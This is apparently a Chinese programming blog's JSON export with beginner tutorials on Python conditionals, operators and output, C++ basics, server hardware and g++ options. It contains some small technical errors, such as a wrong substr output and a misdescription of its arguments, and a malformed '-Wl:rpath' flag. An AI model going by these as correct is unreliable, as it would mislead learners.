条件1成立执行的代码2 ......elif 条件2： 条件2成立执行的代码1 条件2成立执行的代码2 ............else: 以上条件都不成立执行执行的代码 多重判断也可以和else配合使用。一般else放到整个if语句的最后，表示以上条件都不成立的时候执行的代码。 5.2 实例：工龄判断 1234567age = int(input('请输入您的年龄：'))if age &lt; 18: print(f'您的年龄是&#123;age&#125;,童工一枚')elif (age &gt;= 18) and (age &lt;= 60): print(f'您的年龄是&#123;age&#125;,合法工龄')elif age &gt; 60: print(f'您的年龄是&#123;age&#125;,可以退休') 拓展：age &gt;= 18 and age &lt;= 60可以化简为18 &lt;= age &lt;= 60。 六、if嵌套 思考：坐公交：如果有钱可以上车，没钱不能上车；上车后如果有空座，则可以坐下；如果没空座，就要站着。怎么书写程序？ 6.1 语法 1234567if 条件1： 条件1成立执行的代码 条件1成立执行的代码 if 条件2： 条件2成立执行的代码 条件2成立执行的代码 注意：条件2的if也是处于条件1成立执行的代码的缩进关系内部。 6.2 实例：坐公交 6.2.1 判断是否能上车 123456789101112\"\"\"1. 如果有钱，则可以上车 2. 上车后，如果有空座，可以坐下 上车后，如果没有空座，则站着等空座位如果没钱，不能上车\"\"\"# 假设用 money = 1 表示有钱, money = 0表示没有钱money = 1if money == 1: print('土豪，不差钱，顺利上车')else: print('没钱，不能上车，追着公交车跑') 6.2.2 判断是否能坐下 1234567891011121314151617\"\"\"1. 如果有钱，则可以上车 2. 上车后，如果有空座，可以坐下 上车后，如果没有空座，则站着等空座位如果没钱，不能上车\"\"\"# 假设用 money = 1 表示有钱, money = 0表示没有钱; seat = 1 表示有空座，seat = 0 表示没有空座money = 1seat = 0if money == 1: print('土豪，不差钱，顺利上车') if seat == 1: print('有空座，可以坐下') else: print('没有空座，站等')else: print('没钱，不能上车，追着公交车跑') 七. 应用：猜拳游戏 需求分析： 参与游戏的角色 玩家 手动出拳 电脑 随机出拳 判断输赢 玩家获胜 玩家 电脑 石头 剪刀 剪刀 布 布 石头 平局 玩家出拳 和 电脑出拳相同 电脑获胜 随机做法： 1. 导出random模块 2. random.randint(开始,结束) 123456789101112131415161718192021222324252627282930\"\"\"提示：0-石头，1-剪刀，2-布1. 出拳玩家输入出拳电脑随机出拳2. 判断输赢玩家获胜平局电脑获胜\"\"\"# 导入random模块import random# 计算电脑出拳的随机数字computer = random.randint(0, 2)print(computer)player = int(input('请出拳：0-石头，1-剪刀，2-布：'))# 玩家胜利 p0:c1 或 p1:c2 或 p2:c0if (player == 0 and computer == 1) or (player == 1 and computer == 2) or (player == 2 and computer == 0): print('玩家获胜')# 平局：玩家 == 电脑elif player == computer: print('平局')else: print('电脑获胜') 八. 三目运算符 三目运算符也叫三元运算符。 语法如下： 1值1 if 条件 else 值2 快速体验： 12345a = 1b = 2c = a if a &gt; b else bprint(c) 总结 if语句语法 12if 条件: 条件成立执行的代码 if…else… 1234if 条件: 条件成立执行的代码else: 条件不成立执行的代码 多重判断 123456if 条件1: 条件1成立执行的代码elif 条件2: 条件2成立执行的代码else: 以上条件都不成立执行的代码 if嵌套 12345if 条件1: 条件1成立执行的代码 if 条件2: 条件2成立执行的代码 ....","categories":[{"name":"Python","slug":"Python","permalink":"https://xiaowuyoucy.github.io/categories/Python/"}],"tags":[]},{"title":"数据类型转换和运算符","slug":"数据类型转换和运算符","date":"2022-03-06T07:40:31.000Z","updated":"2022-03-06T08:02:49.571Z","comments":true,"path":"2022/03/06/数据类型转换和运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/03/06/数据类型转换和运算符/","excerpt":"","text":"目标 数据类型转换的必要性 数据类型转换常用方法 一. 转换数据类型的作用 问：input()接收用户输入的数据都是字符串类型，如果用户输入1，想得到整型该如何操作？ 答：转换数据类型即可，即将字符串类型转换成整型。 二. 转换数据类型的函数 函数 说明 int(x [,base ]) 将x转换为一个整数 float(x ) 将x转换为一个浮点数 complex(real [,imag ]) 创建一个复数，real为实部，imag为虚部 str(x ) 将对象 x 转换为字符串 repr(x ) 将对象 x 转换为表达式字符串 eval(str ) 用来计算在字符串中的有效Python表达式,并返回一个对象 tuple(s ) 将序列 s 转换为一个元组 list(s ) 将序列 s 转换为一个列表 chr(x ) 将一个整数转换为一个Unicode字符 ord(x ) 将一个字符转换为它的ASCII整数值 hex(x ) 将一个整数转换为一个十六进制字符串 oct(x ) 将一个整数转换为一个八进制字符串 bin(x ) 将一个整数转换为一个二进制字符串 三. 快速体验 需求：input接收用户输入，用户输入“1”，将这个数据1转换成整型。 123456789101112# 1. 接收用户输入num = input('请输入您的幸运数字：')# 2. 打印结果print(f\"您的幸运数字是&#123;num&#125;\")# 3. 检测接收到的用户输入的数据类型 -- str类型print(type(num))# 4. 转换数据类型为整型 -- int类型print(type(int(num))) 四. 实验 123456789101112131415161718192021222324252627# 1. float() -- 转换成浮点型num1 = 1print(float(num1))print(type(float(num1)))# 2. str() -- 转换成字符串类型num2 = 10print(type(str(num2)))# 3. tuple() -- 将一个序列转换成元组list1 = [10, 20, 30]print(tuple(list1))print(type(tuple(list1)))# 4. list() -- 将一个序列转换成列表t1 = (100, 200, 300)print(list(t1))print(type(list(t1)))# 5. eval() -- 将字符串中的数据转换成Python表达式原本类型str1 = '10'str2 = '[1, 2, 3]'str3 = '(1000, 2000, 3000)'print(type(eval(str1)))print(type(eval(str2)))print(type(eval(str3))) 总结 转换数据类型常用的函数 int() float() str() list() tuple() eval() 目标 掌握常用运算符的作用 运算符的分类 算数运算符 赋值运算符 复合赋值运算符 比较运算符 逻辑运算符 1. 算数运算符 运算符 描述 实例 + 加 1 + 1 输出结果为 2 - 减 1-1 输出结果为 0 * 乘 2 * 2 输出结果为 4 / 除 10 / 2 输出结果为 5 // 整除 9 // 4 输出结果为2 % 取余 9 % 4 输出结果为 1 ** 指数 2 ** 4 输出结果为 16，即 2 * 2 * 2 * 2 () 小括号 小括号用来提高运算优先级，即 (1 + 2) * 3 输出结果为 9 注意： 混合运算优先级顺序：()高于 ** 高于 * / // % 高于 + - 2. 赋值运算符 运算符 描述 实例 = 赋值 将=右侧的结果赋值给等号左侧的变量 单个变量赋值 12num = 1print(num) 多个变量赋值 1234num1, float1, str1 = 10, 0.5, 'hello world'print(num1)print(float1)print(str1) 多变量赋相同值 123a = b = 10print(a)print(b) 3. 复合赋值运算符 运算符 描述 实例 += 加法赋值运算符 c += a 等价于 c = c + a -= 减法赋值运算符 c -= a 等价于 c = c- a *= 乘法赋值运算符 c *= a 等价于 c = c * a /= 除法赋值运算符 c /= a 等价于 c = c / a //= 整除赋值运算符 c //= a 等价于 c = c // a %= 取余赋值运算符 c %= a 等价于 c = c % a **= 幂赋值运算符 c ** = a 等价于 c = c ** a 1234567891011121314a = 100a += 1# 输出101 a = a + 1,最终a = 100 + 1print(a)b = 2b *= 3# 输出6 b = b * 3,最终b = 2 * 3print(b)c = 10c += 1 + 2# 输出13, 先算运算符右侧1 + 2 = 3， c += 3 , 推导出c = 10 + 3print(c) 4. 比较运算符 比较运算符也叫关系运算符， 通常用来判断。 运算符 描述 实例 == 判断相等。如果两个操作数的结果相等，则条件结果为真(True)，否则条件结果为假(False) 如a=3,b=3，则（a == b) 为 True != 不等于 。如果两个操作数的结果不相等，则条件为真(True)，否则条件结果为假(False) 如a=3,b=3，则（a == b) 为 True如a=1,b=3，则(a != b) 为 True &gt; 运算符左侧操作数结果是否大于右侧操作数结果，如果大于，则条件为真，否则为假 如a=7,b=3，则(a &gt; b) 为 True &lt; 运算符左侧操作数结果是否小于右侧操作数结果，如果小于，则条件为真，否则为假 如a=7,b=3，则(a &lt; b) 为 False &gt;= 运算符左侧操作数结果是否大于等于右侧操作数结果，如果大于，则条件为真，否则为假 如a=7,b=3，则(a &lt; b) 为 False如a=3,b=3，则(a &gt;= b) 为 True &lt;= 运算符左侧操作数结果是否小于等于右侧操作数结果，如果小于，则条件为真，否则为假 如a=3,b=3，则(a &lt;= b) 为 True 12345678a = 7b = 5print(a == b) # Falseprint(a != b) # Trueprint(a &lt; b) # Falseprint(a &gt; b) # Trueprint(a &lt;= b) # Falseprint(a &gt;= b) # True 5. 逻辑运算符 运算符 逻辑表达式 描述 实例 and x and y 布尔&quot;与&quot;：如果 x 为 False，x and y 返回 False，否则它返回 y 的值。 True and False， 返回 False。 or x or y 布尔&quot;或&quot;：如果 x 是 True，它返回 True，否则它返回 y 的值。 False or True， 返回 True。 not not x 布尔&quot;非&quot;：如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。 not True 返回 False, not False 返回 True 1234567a = 1b = 2c = 3print((a &lt; b) and (b &lt; c)) # Trueprint((a &gt; b) and (b &lt; c)) # Falseprint((a &gt; b) or (b &lt; c)) # Trueprint(not (a &gt; b)) # True 5.1 拓展 数字之间的逻辑运算 12345678910111213141516a = 0b = 1c = 2# and运算符，只要有一个值为0，则结果为0，否则结果为最后一个非0数字print(a and b) # 0print(b and a) # 0print(a and c) # 0print(c and a) # 0print(b and c) # 2print(c and b) # 1# or运算符，只有所有值为0结果才为0，否则结果为第一个非0数字print(a or b) # 1print(a or c) # 2print(b or c) # 1 总结 算数运算的优先级 混合运算优先级顺序：()高于 ** 高于 * / // % 高于 + - 赋值运算符 = 复合赋值运算符 += -= 优先级 先算复合赋值运算符右侧的表达式 再算复合赋值运算的算数运算 最后算赋值运算 比较运算符 判断相等： == 大于等于： &gt;= 小于等于：&lt;= 不等于： != 逻辑运算符 与： and 或：or 非：not","categories":[{"name":"Python","slug":"Python","permalink":"https://xiaowuyoucy.github.io/categories/Python/"}],"tags":[]},{"title":"走进Linux世界","slug":"走进Linux世界","date":"2022-03-03T16:07:14.000Z","updated":"2022-03-03T18:55:20.669Z","comments":true,"path":"2022/03/04/走进Linux世界/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/03/04/走进Linux世界/","excerpt":"","text":"IDC(Internet Data Center) 互联网数据中心 IDC主机托管主要应用范围是网站发布、虚拟主机和电子商务等。 物理服务器介绍 一个机柜一般摆放7台到10台服务器,分为A,B路 服务器的高度单位是U 1U=1.75英寸 物理服务器分类 塔式服务器 机架式服务器 刀片服务器 塔式服务器 塔式服务器是我们⽣活中⻅得⽐较多的，主要是因为塔式服务器的外形结构和普通PC⽐较类似。塔式服务器尺⼨没有统⼀标准，由于塔式服务器的机箱⽐较⼤，服务器的配置也可以很⾼，冗余扩展更可以很⻬备，所以它的应⽤范围⾮常⼴，应该说⽬前使⽤率最⾼的⼀种服务器就是塔式服务器。 机架式服务器 机架式服务器的外形看来不像计算机，⽽像交换机，有1U（1U=1.75英⼨）、2U、4U等规格。机架式服务器安装在标准的19英⼨机柜⾥⾯。这种结构的多为功能型服务器。 刀片式服务器 刀片服务器是指在标准⾼度的机架式机箱内可插装多个卡式的服务器单元，是⼀种实现HAHD(⾼可⽤⾼密度)的低成本服务器平台，为特殊应⽤⾏业和⾼密度计算环境专⻔设计。刀片服务器就像“刀片”⼀样，每⼀块“刀片”实际上就是⼀块系统主板。 一个机柜如果超过10台服务器就有可能会超电，从而引起短路 所以机柜不允许超过10台服务器 如果服务器断网了，可以通过管理卡交换机来连接到服务器。","categories":[{"name":"RHCE","slug":"RHCE","permalink":"https://xiaowuyoucy.github.io/categories/RHCE/"}],"tags":[]},{"title":"变量和数据类型与输出","slug":"变量和数据类型","date":"2022-03-03T15:33:52.000Z","updated":"2022-03-03T15:38:46.326Z","comments":true,"path":"2022/03/03/变量和数据类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/03/03/变量和数据类型/","excerpt":"","text":"目标 注释的作用 注释的分类及语法 注释的特点 一. 注释的作用 通过用自己熟悉的语言，在程序中对某些代码进行标注说明，这就是注释的作用，能够大大增强程序的可读性。 二. 注释的分类及语法 注释分为两类：单行注释 和 多行注释。 单行注释 只能注释一行内容，语法如下： 1# 注释内容 多行注释 可以注释多行内容，一般用在注释一段代码的情况， 语法如下： 1234567891011\"\"\" 第一行注释 第二行注释 第三行注释\"\"\"''' 注释1 注释2 注释3''' 快捷键： ctrl + / 2.1 快速体验 单行注释 1234# 输出hello worldprint('hello world')print('hello Python') # 输出(简单的说明可以放到一行代码的后面，一般习惯代码后面添加两个空格再书写注释文字) 多行注释 1234567891011121314151617181920\"\"\" 下面三行都是输出的作用，输出内容分别是： hello Python hello itcast hello itheima\"\"\"print('hello Python')print('hello itcast')print('hello itheima')''' 下面三行都是输出的作用，输出内容分别是： hello Python hello itcast hello itheima'''print('hello Python')print('hello itcast')print('hello itheima') 注意：解释器不执行任何的注释内容。 总结 注释的作用 用人类熟悉的语言对代码进行解释说明，方便后期维护。 注释的分类 单行： # 注释内容，快捷键ctrl+/ 多行：&quot;&quot;&quot; 注释内容 &quot;&quot;&quot; 或 ''' 注释内容 ''' 解释器不执行注释内容 定义变量 1变量名 = 值 变量名自定义，要满足标识符命名规则。 2.1 标识符 标识符命名规则是Python中定义各种名字的时候的统一规范，具体如下： 由数字、字母、下划线组成 不能数字开头 不能使用内置关键字 严格区分大小写 12345False None True and as assert break class continue def del elif else except finally forfrom global if import in is lambda nonlocalnot or pass raise return try while with yield 2.2 命名习惯 见名知义。 大驼峰：即每个单词首字母都大写，例如：MyName。 小驼峰：第二个（含）以后的单词首字母大写，例如：myName。 下划线：例如：my_name。 2.3 使用变量 12345my_name = 'TOM'print(my_name)schoolName = '黑马程序员'print(schoolName) 2.4 认识bug 所谓bug，就是程序中的错误。如果程序有错误，需要程序员排查问题，纠正错误。 三. Debug工具 Debug工具是PyCharm IDE中集成的用来调试程序的工具，在这里程序员可以查看程序的执行细节和流程或者调解bug。 Debug工具使用步骤： 打断点 Debug调试 3.1 打断点 断点位置 目标要调试的代码块的第一行代码即可，即一个断点即可。 打断点的方法 单击目标代码的行号右侧空白位置。 3.2 Debug调试 打成功断点后，在文件内部任意位置 — 右键 – Debug’文件名’ — 即可调出Debug工具面板 – 单击Step Over/F8，即可按步执行代码。 3.2.1 Debug输出面板分类 Debugger 显示变量和变量的细节 Console 输出内容 四. 认识数据类型 在 Python 里为了应对不同的业务需求，也把数据分为不同的类型。 检测数据类型的方法：type() 1234567891011121314151617181920212223a = 1print(type(a)) # &lt;class 'int'&gt; -- 整型b = 1.1print(type(b)) # &lt;class 'float'&gt; -- 浮点型c = Trueprint(type(c)) # &lt;class 'bool'&gt; -- 布尔型d = '12345'print(type(d)) # &lt;class 'str'&gt; -- 字符串e = [10, 20, 30]print(type(e)) # &lt;class 'list'&gt; -- 列表f = (10, 20, 30)print(type(f)) # &lt;class 'tuple'&gt; -- 元组h = &#123;10, 20, 30&#125;print(type(h)) # &lt;class 'set'&gt; -- 集合g = &#123;'name': 'TOM', 'age': 20&#125;print(type(g)) # &lt;class 'dict'&gt; -- 字典 总结 定义变量的语法 1变量名 = 值 标识符 由数字、字母、下划线组成 不能数字开头 不能使用内置关键字 严格区分大小写 数据类型 整型：int 浮点型：float 字符串：str 布尔型：bool 元组：tuple 集合：set 字典：dict 目标 格式化输出 格式化符号 f-字符串 print的结束符 输出 作用：程序输出内容给用户 123456print('hello Python')age = 18print(age)# 需求：输出“今年我的年龄是18岁” 一. 格式化输出 所谓的格式化输出即按照一定的格式输出内容。 1.1 格式化符号 格式符号 转换 %s 字符串 %d 有符号的十进制整数 %f 浮点数 %c 字符 %u 无符号十进制整数 %o 八进制整数 %x 十六进制整数（小写ox） %X 十六进制整数（大写OX） %e 科学计数法（小写’e’） %E 科学计数法（大写’E’） %g %f和%e的简写 %G %f和%E的简写 技巧 %06d，表示输出的整数显示位数，不足以0补全，超出当前位数则原样输出 %.2f，表示小数点后显示的小数位数。 1.2 体验 格式化字符串除了%s，还可以写为f'{表达式}' 12345678910111213141516171819202122age = 18 name = 'TOM'weight = 75.5student_id = 1# 我的名字是TOMprint('我的名字是%s' % name)# 我的学号是0001print('我的学号是%4d' % student_id)# 我的体重是75.50公斤print('我的体重是%.2f公斤' % weight)# 我的名字是TOM，今年18岁了print('我的名字是%s，今年%d岁了' % (name, age))# 我的名字是TOM，明年19岁了print('我的名字是%s，明年%d岁了' % (name, age + 1))# 我的名字是TOM，明年19岁了print(f'我的名字是&#123;name&#125;, 明年&#123;age + 1&#125;岁了') f-格式化字符串是Python3.6中新增的格式化方法，该方法更简单易读。 1.3 转义字符 \\n：换行。 \\t：制表符，一个tab键（4个空格）的距离。 1.4 结束符 想一想，为什么两个print会换行输出？ 1print('输出的内容', end=\"\\n\") 在Python中，print()， 默认自带end=&quot;\\n&quot;这个换行结束符，所以导致每两个print直接会换行展示，用户可以按需求更改结束符。 总结 格式化符号 %s：格式化输出字符串 %d：格式化输出整数 %f：格式化输出浮点数 f-字符串 f’{表达式}’ 转义字符 \\n：换行 \\t：制表符 print结束符 1print('内容', end=\"\")","categories":[{"name":"Python","slug":"Python","permalink":"https://xiaowuyoucy.github.io/categories/Python/"}],"tags":[]},{"title":"Python简介","slug":"Python简介","date":"2022-03-03T09:47:53.000Z","updated":"2022-03-03T15:34:12.552Z","comments":true,"path":"2022/03/03/Python简介/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/03/03/Python简介/","excerpt":"","text":"Python介绍 简单、易学，适应人群广泛 免费、开源 应用领域广泛 Python版本 Python 2.X Python 3.X Python 3.5 Python 3.6 Python 3.7 解释器的作用 Python解释器作用：运行文件 Python解释器种类 CPython，C语言开发的解释器[官方]，应用广泛的解释器。 IPython，基于CPython的一种交互式解释器。 其他解释器 PyPy，基于Python语言开发的解释器。 Jython，运行在Java平台的解释器，直接把Python代码编译成Java字节码执行。 IronPython，运行在微软.Net平台上的Python解释器，可以直接把Python代码编译成.Net的字节码。 下载Python解释器 下载地址：https://www.python.org/downloads/release/python-372/ [单击上述链接] – 查找目标文件：Windows x86-64 executable installer – 单击即可下载。 安装Python解释器 双击可执行文件 — 勾选[pip] – [Next] – [勾选添加环境变量] – [Install]，按提示操作即可。 PyCharm PyCharm的作用 下载安装PyCharm PyCharm的基本使用 PyCharm的基本设置 PyCharm的作用 PyCharm是一种Python IDE（集成开发环境），带有一整套可以帮助用户在使用Python语言开发时提高其效率的工具，内部集成的功能如下： Project管理 智能提示 语法高亮 代码跳转 调试代码 解释代码(解释器) 框架和库 … PythonCharm分为专业版（professional）和社区版（community），本视频以社区版为基准进行操作和讲解。 下载和安装 2.1 下载 下载地址：http://www.jetbrains.com/pycharm/download/#section=windows 注意：这里选择Community(社区版)下载，专业版是收费版本，社区版可以满足我们基础编程需求。 2.2 安装 双击安装包 – [运行] – [允许你应用更改设备]: [是] – [Next] – [选择安装位置] – [Next] – [Install] – [Finish]。 PyCharm基本使用 3.1 新建项目 打开PyCharm – [Create New Project] – 选择项目根目录和解释器版本 – [Create]，即可完成新建一个项目。 3.2 新建文件并书写代码 项目根目录或根目录内部任意位置 — 右键 – [New] – [Python File] – 输入文件名 – [OK] 如果是将来要上传到服务器的文件，那么文件名切记不能用中文。 双击打开文件，并书写一个最简单的Python代码： 1print(\"hello world\") 3.3 运行文件 文件打开状态 – 空白位置 — 右键 – Run – 即可调出Pycharm的控制台输出程序结果。 四. PyCharm的基本设置 [file] – [Settings]/[Default Settings]。 4.1 修改主题 [Appearance &amp; Behavior] – [Appearance] Theme：修改主题 Name：修改主题字体 Size：修改主题字号 4.2 修改代码文字格式 [Editor] – [Font] Font：修改字体 Size：修改字号 Line Spacing：修改行间距 4.3 修改解释器 [Project: 项目名称] – [Project Interpreter] – [设置图标] – [Add] – 浏览到目标解释器 – [OK] – [OK]。 4.4 项目管理 4.4.1 打开项目 [File] – [Open] – 浏览选择目标项目根目录 – [OK] – 选择打开项目方式。 打开项目的方式共三种，分别如下 This Window 覆盖当前项目，从而打开目标项目 New Window 在新窗口打开，则打开两次PyCharm，每个PyCharm负责一个项目。 Attach 在当前项目中打开,且不覆盖 4.4.2 关闭项目 [File] – [Close Project]/[Close Projects in current window] 总结 PyCharm新建文件 项目管理空白位置 — 右键 – New – PythonFile 运行文件 代码内部 — 右键 – Run 修改代码文字格式 [file] – [Settings]/[Default Settings] – [Editor] – [Font]","categories":[{"name":"Python","slug":"Python","permalink":"https://xiaowuyoucy.github.io/categories/Python/"}],"tags":[]},{"title":"cpp介绍","slug":"cpp介绍","date":"2022-02-21T16:57:55.000Z","updated":"2022-02-23T17:33:55.172Z","comments":true,"path":"2022/02/22/cpp介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/02/22/cpp介绍/","excerpt":"","text":"函数 每个c++程序都从main函数开始执行 函数的定义格式: 12345返回值类型 函数名(参数列表)&#123; (多个语句构成的)函数体&#125; 语句 C++程序的最小完整执行指令都是以分号结尾的语句。 可以将一条语句写在多个行，不管中间有多少空格、回车符、换行符，最后都是以分号作为语句的结束。 程序注释 多行注释 以/*开头，然后以*/结束 123/* 多行注释*/ 单行注释 1// 单行注释 块注释不能嵌套,既不能在块注释中再出现/* 或 */ hello world程序 1234567#include&lt;iostream&gt;using namespace std;int main()&#123; cout &lt;&lt; \"hello world\"; return 0;&#125; 标准输入输出库和cout 要使用标准输入输出库就要包含头文件#include&lt;iostream&gt; stream是流的意思，io是输入input输出output的缩写。 #include指令称为包含预处理指令,意思是用文件iostream的内容来替换掉这个预处理指令 cout对象代表的是标准输出流对象(既代表终端窗口) 命名空间 一个c程序可能会使用其他人写的库,例如有A库和B库,这两个库中的全局变量或函数的名字都有可能相同,为了避免冲突,c引入了命名空间将这两个库区分开来。 C++自带的标准库中的所有对象、函数等都属于一个叫std的标准命名空间。 1using namespace std; 将整个标准名字空间std的名字都引入到程序中,写上这句话就可以直接调用std命名空间中的变量或函数了 名字空间限定 123456命名空间::变量/函数std::coutstd::cout表示这是名字空间std的coutstd::endl表示std命名空间中的endl,代表换行符 用using引入单个名字 12345using std::cout;cout &lt;&lt; &quot;123&quot; &lt;&lt; 456&quot;;引入之后,后面就不需要在用名字限定了输出运算符&lt;&lt;可以连续使用,这是因为cout &lt;&lt; &quot;123&quot; 返回的还是cout 字符串和字符 单引号括起来的表示一个字符 1&apos;n&apos; &apos;,&apos; &apos;a&apos; 双引号括起来的表示一个字符串 1&quot;abd&quot; &quot;123&quot; &quot;asd&quot; \\n和endl的区别 \\n和endl都表示换行符，endl会强制程序的缓冲区里面的数据立即输出 \\t表示制表符 宏定义 1234#define 宏名 值#define PI 3.1415程序预处理阶段是,会将程序中所有的PI都用3.1415来替换 变量 变量是命名的内存块。 在c++中变量也称为对象 每个变量都有一个数据类型,例如: 123int i;double r;double area; {}初始值 123int i&#123;2&#125;;double r&#123;2.5&#125;;double area = 0; 标准输入流对象cin cin输入流对象,代表键盘对象 12double r;cin &gt;&gt; r; //重键盘输入一个数字到r中 用户自定义类型 string类型 要使用string类型需要包含头文件 1#include&lt;string&gt; string类型有一个size()成员函数,可以返回string对象的字符个数 12string s1 = &quot;abc&quot;;cout &lt;&lt; s1.size() &lt;&lt; endl; substr(s,e)成员函数返回string对象下标s到e(不包含e)之间的字符构成的一个字符串 12string s1 = &quot;123456&quot;;cout &lt;&lt; s1.substr(1,4) &lt;&lt; endl; //输出123 可以用+将两个字符串对象拼接起来 123string s1 = &quot;abc&quot;;string s2 = &quot;def&quot;;cout &lt;&lt; s1 + s2 &lt;&lt; endl; //输出abcdef 数字表示 用0b开头表示一串二进制表示一个二进制数 10b000010111 十六进制 用0x表示16进制数 10x12 0xFA 0xFF 八进制 用0开头表示8进制数 1012 044 0777 123std::dec // 以十进制方式输出std::hex // 以十六进制方式输出std::oct // 以八进制方式输出 编译c++程序 1234g++ 源文件名 -o 目标程序名g++ test.cpp -o test最终生成test程序 变量和数据类型 变量的定义格式 1类型名 变量名&#123;&#125;; {}方式的初始化称为列表初始化 如果{}里面没有值,对于基本类型的变量,初始值默认为0,有的编译器则会发出警告或报错 信息损失则报错 1int a&#123;1.2&#125;; //1.2会截取小数部分,导致信息损失,所以会报错 auto 用auto定义一个有初始值的变量时,不需要明确指定类型,因为编译器能自动从变量的初始值推断出该变量的数据类型。 12345auto b = true; // boolauto ch&#123;&apos;x&apos;&#125;; // charauto i = 123; // intauto d&#123;1.2&#125;; // doubleauto z = d + i; // 从表达式的d+i的值来推断z的数据类型 typeid运算符 可以用typeid运算符查询得到一个数据类型或变量的信息 12cout &lt;&lt; typeid(int) .name() &lt;&lt; endl;cout &lt;&lt; typeid(b).name() &lt;&lt; endl; decltype 用decltype(exp)得到一个表达式的值的类型,并用这个类型来定义一个变量。 1decltype(3 + 4.5) c; 基本类型 123wchar_t 宽字符类型,在windows平台上是16位 2字节类型char16_t 表示UTF-16类型char32_t 表示UTF-32字符类型 整型文字常量 字母u或U表示unsigned整型 字母l或L表示long整型 字母ll或LL表示 long long整型 12345678918u // unsigned18U // unsigned022L // long18l // long 18LL // long long0x12uL // unsigned long 18ULL // long long 浮点型文字常量 默认是double 用f或F表示float 用l或L表示long double 1234563.143.14f3.14F3.14L3.14l 字符串文字常量 L表示 wchar_t u表示 char16_t U表示 char32_t u8前缀表示 UTF-8 12345678L&apos;A&apos; // wchar_t u&apos;A&apos; // char16_t U&apos;A&apos; // char32_tu8&apos;A&apos; // utf-8u8&quot;abcd&quot; 原始字符串 不需要处理转义字符 1R&quot;1234\\n&quot; 格式化输出 流操作符定义在2个头文件中 12iomanip.hios.h //ios头文件已经被iostream头文件包含,该头文件中的操纵符不带任何参数 ios.h 12345678std::dec; // 十进制输出std::hex; // 十六进制输出std::oct; // 八进制输出std::fixed; // 以固定精度形式输出std::scientific; // 以科学计数法形式输出std::hexfloat; // 以十六进制浮点形式输出std::defaultfloat; // 以默认形式输出 iomanip.h iomanip的操纵符需要传递一个参数 12345std::setw(n); //改变输出域的宽度std::setprecision(n) //改变浮点数的精度//改变填空字符,当setw的输出域宽度大于输出值的宽度时,默认的填空字符是空格,可以用setfill(ch)改变这个填空字符std::setfill(ch) 12345678cout &lt;&lt; setprecision(2) &lt;&lt; 3.1415926 &lt;&lt; endl;cout &lt;&lt; setw(10) &lt;&lt; 3.1415926 &lt;&lt; endlcout &lt;&lt; setw(10) &lt;&lt; setfill(&apos;-&apos;) &lt;&lt; 3.1415926 &lt;&lt; endl;输出3.1 3.1----------3.1 强制类型转换 12345(类型) 值(int)123;static_cast&lt;类型&gt;值static_cast&lt;int&gt;123; 类型别名 可以用关键字using给一个数据类型起另外的名字,称为类型别名 123using 别名 = 类型;using INT = int; 上面的意思是 如果定义了 USING_COMPILER_A则执行下面这部分，否则则执行另外这部分。 枚举 不同的枚举类型的值是不能相互比较或赋值的 。 123enum class Day&#123;Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday&#125;;Day d&#123;Day::Tuesday&#125;; //定义一个Day类型的d变量并初始值为Tuesday","categories":[{"name":"cpp17从入门到精通","slug":"cpp17从入门到精通","permalink":"https://xiaowuyoucy.github.io/categories/cpp17从入门到精通/"}],"tags":[]},{"title":"g++使用","slug":"linux000g加加使用","date":"2022-02-09T17:01:38.000Z","updated":"2022-02-09T17:17:08.065Z","comments":true,"path":"2022/02/10/linux000g加加使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/02/10/linux000g加加使用/","excerpt":"","text":"g++是GNU组织推出的C++编译器。它不但可以用来编译传统的C++程序，也可以用来编译现代C++，比如C++11/14等。 g++的用法和gcc类似，编译C++的时候比gcc更简单，因为它会自动链接到C++标准库，而不像gcc需要手工指定。 g++编译程序的内部过程和gcc一样，也要经过4个阶段：预处理、编译、汇编和链接。 g++的基本语法格式如下： 1g++ [选项] 准备编译的文件 [选项] [目标文件] 编译单个源文件 1g++ test.cpp -o test test.cpp为需要编译的源文件，test为输出的可执行目录 编译多个源文件 1g++ testspeaker.cpp speaker.cpp -o testspeaker testspeaker.cpp speaker.cpp 需要编译的2个源文件 更多参数详解 -E 只激活预处理,这个不生成文件,你需要把它重定向到一个输出文件里面. 1g++ -E test.cpp &gt; test.txt -S 只激活预处理和编译，就是指把文件编译成为汇编代码。 1g++ -S test.cpp 他将生成.s的汇编代码，你可以用文本编辑器察看 -c 只激活预处理,编译,和汇编,也就是他只把程序做成obj文件 1gcc -c hello.c 他将生成.o的obj文件 目录选项 -Wl:rpath,添加运行时库路径 -Wl:rpath, 后面也是路径，运行的时候用。这条编译指令会在编译时记录到target文件中，所以编译之后的target文件在执行时会按这里给出的路径去找库文件。 如：-Wl:rpath=/home/hello/lib 表示将/home/hello/lib目录作为程序运行时第一个寻找库文件的目录，程序寻找顺序是：/home/hello/lib–&gt;/usr/lib–&gt;/usr/local/lib。 可以加多个包含路径，程序在运行时的寻找顺序为添加的顺序。 -L,添加链接库路径 -L后跟路径，告诉链接器从哪找库(.so文件)，只有在链接时会用到。 如：-L /home/hello/lib 表示将/home/hello/lib目录作为第一个寻找库文件的目录，寻找顺序是：/home/hello/lib–&gt;/usr/lib–&gt;/usr/local/lib。 可以加多个包含路径，链接器的寻找顺序为添加的顺序。 -l,添加引用链接库 -l 在链接时用到，它的作用是告诉链接器，要用到哪个库。 如：-l pthread 告诉链接器(linker)，程序需要链接pthread这个库,这里的pthread是库名不是文件名，具体来说文件句是libpthread.so -I,添加包含路径 -I在编译时用，告诉编译器去哪个路径下找文件 如：-I /home/hello/include 表示将/home/hello/include目录作为第一个寻找头文件的目录。 编译器的寻找顺序是：/home/hello/include–&gt;/usr/include–&gt;/usr/local/include。如果在/home/hello/include中有个文件hello.h，则在程序中用#include就能引用到这个文件。 可以加多个包含路径，编译器的寻找顺序为添加的顺序。 调试选项 -g 只是编译器，在编译的时候，产生调试信息。 -gstabs 此选项以stabs格式声称调试信息,但是不包括gdb调试信息. -gstabs+ 此选项以stabs格式声称调试信息,并且包含仅供gdb使用的额外调试信息. -ggdb 此选项将尽可能的生成gdb的可以使用的调试信息. -glevel 请求生成调试信息，同时用level指出需要多少信息，默认的level值是2 链接选项 -static此选项将禁止使用动态库。 优点：程序运行不依赖于其他库 